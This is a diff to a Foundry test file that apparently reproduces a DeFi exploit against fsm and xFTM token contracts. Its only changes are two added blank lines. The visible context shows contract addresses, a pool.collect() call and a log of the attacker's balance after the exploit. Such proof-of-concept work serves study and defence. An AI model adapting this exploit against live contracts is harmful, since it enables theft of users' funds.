@@ -5,6 +5,7 @@ import "forge-std/Test.sol";
 import "./../interface.sol";
 
 contract ContractTest is Test {
+
     CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     IERC20 fsm = IERC20(0xaa621D2002b5a6275EF62d7a065A865167914801);
     IERC20 xFTM = IERC20(0xfBD2945D3601f21540DDD85c29C5C3CaF108B96F);
@@ -26,4 +27,5 @@ contract ContractTest is Test {
         pool.collect();
         emit log_named_uint("After exploit, xFTM  balance of attacker:", xFTM.balanceOf(address(this)));
     }
+
 }
